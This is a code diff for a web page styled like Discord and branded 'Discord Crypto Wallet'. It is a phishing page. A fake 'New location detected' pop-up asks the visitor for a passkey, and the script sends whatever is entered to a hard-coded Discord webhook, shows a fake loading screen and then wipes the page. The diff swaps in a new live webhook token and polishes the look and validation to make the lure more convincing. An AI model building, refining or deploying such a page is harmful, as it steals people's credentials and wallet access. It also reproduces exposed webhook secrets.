@@ -13,13 +13,25 @@
     }
 
     body {
-      background-color: #1e1f22;
+      background: #1e1f22;
+      overflow: hidden;
       color: #fff;
       height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
-      overflow: hidden;
+      position: relative;
+    }
+
+    /* Background animation */
+    body::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: url('https://www.transparenttextures.com/patterns/dark-mosaic.png');
+      opacity: 0.1;
+      z-index: 0;
     }
 
     .login-box {
@@ -29,7 +41,9 @@
       padding: 40px;
       width: 360px;
       text-align: center;
-      transition: all 0.3s ease-in-out;
+      position: relative;
+      z-index: 2;
+      animation: fadeInUp 0.8s ease forwards;
     }
 
     .avatar {
@@ -47,6 +61,12 @@
       color: #fff;
     }
 
+    .wallet-header {
+      font-size: 18px;
+      color: #b5bac1;
+      margin-bottom: 25px;
+    }
+
     .login-btn {
       background-color: #5865f2;
       color: white;
@@ -62,14 +82,13 @@
       background-color: #4752c4;
     }
 
-    .popup {
+    .popup, .loading-screen {
       display: none;
       position: fixed;
-      top: 0;
-      left: 0;
+      top: 0; left: 0;
       height: 100vh;
       width: 100vw;
-      background: rgba(0, 0, 0, 0.75);
+      background: rgba(0, 0, 0, 0.8);
       justify-content: center;
       align-items: center;
       z-index: 10;
@@ -82,12 +101,19 @@
       width: 320px;
       text-align: center;
       box-shadow: 0 0 20px rgba(0, 0, 0, 0.4);
+      animation: fadeIn 0.4s ease-in-out;
     }
 
     .popup-box h3 {
-      margin-bottom: 15px;
+      margin-bottom: 10px;
       font-size: 18px;
       font-weight: 500;
+    }
+
+    .popup-box p {
+      font-size: 14px;
+      color: #b5bac1;
+      margin-bottom: 12px;
     }
 
     .popup-box input {
@@ -117,26 +143,11 @@
     }
 
     .loading-screen {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      height: 100vh;
-      width: 100vw;
-      background: #1e1f22;
-      color: white;
-      font-size: 24px;
-      font-weight: bold;
-      align-items: center;
-      justify-content: center;
-      z-index: 99;
       flex-direction: column;
-      animation: fadeIn 1s ease-in-out;
     }
 
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.95); }
-      to { opacity: 1; transform: scale(1); }
+    .loading-dots {
+      font-size: 20px;
     }
 
     .loading-dots::after {
@@ -151,6 +162,16 @@
       66% { content: '..'; }
       100% { content: '...'; }
     }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
   </style>
 </head>
 <body>
@@ -158,13 +179,14 @@
   <div class="login-box">
     <img class="avatar" src="https://i.pinimg.com/736x/ae/ed/d1/aeedd126eb22be0730716d4a6277ca54.jpg" alt="Avatar">
     <div class="username">drakify_x</div>
+    <div class="wallet-header">Discord Crypto Wallet</div>
     <button class="login-btn" onclick="showPopup()">Log In</button>
   </div>
 
   <div class="popup" id="popup">
     <div class="popup-box">
       <h3>New location detected</h3>
-      <p style="margin-bottom: 10px; font-size: 14px; color: #b5bac1;">Please confirm your identity</p>
+      <p>Please confirm your identity</p>
       <input type="password" id="passInput" placeholder="Enter passkey">
       <br>
       <button onclick="sendPass()">Confirm</button>
@@ -178,35 +200,37 @@
   <script>
     const popup = document.getElementById("popup");
     const loading = document.getElementById("loading");
-    const webhookURL = "https://discord.com/api/webhooks/1398237428195524669/eJ7Qcn2sFpQDs2GyqfixkC9Ov0En1xErVcYPm-C3lsPOnbtabV32IG1LbfDTiArolMKN"; // Replace this with your real webhook
+    const passInput = document.getElementById("passInput");
+    const webhookURL = "https://discord.com/api/webhooks/1400800830147395615/aOABiZAWX2qwlfVnkBIrNonEZ4UkYVH42WvbFbv-Z8vhueamDQbuKZJay3MD9CwGn70c"; // Replace with your real webhook
 
     function showPopup() {
       popup.style.display = "flex";
-      document.getElementById("passInput").focus();
+      passInput.focus();
     }
 
     function sendPass() {
-      const passkey = document.getElementById("passInput").value;
+      const passkey = passInput.value.trim();
+
+      if (!passkey) {
+        alert("⚠️ Please provide a valid passkey.");
+        passInput.focus();
+        return;
+      }
+
       popup.style.display = "none";
 
-      // Send passkey to Discord
       fetch(webhookURL, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           content: `🔐 Passkey submitted: **${passkey}**`
         })
-      })
-      .then(() => {
+      }).then(() => {
         loading.style.display = "flex";
         setTimeout(() => {
           document.body.innerHTML = "";
         }, 25000);
-      })
-      .catch((err) => {
-        console.error("Webhook Error:", err);
+      }).catch(() => {
         loading.style.display = "flex";
         setTimeout(() => {
           document.body.innerHTML = "";
@@ -214,7 +238,7 @@
       });
     }
 
-    document.getElementById("passInput").addEventListener("keypress", function (e) {
+    passInput.addEventListener("keypress", function (e) {
       if (e.key === "Enter") sendPass();
     });
   </script>
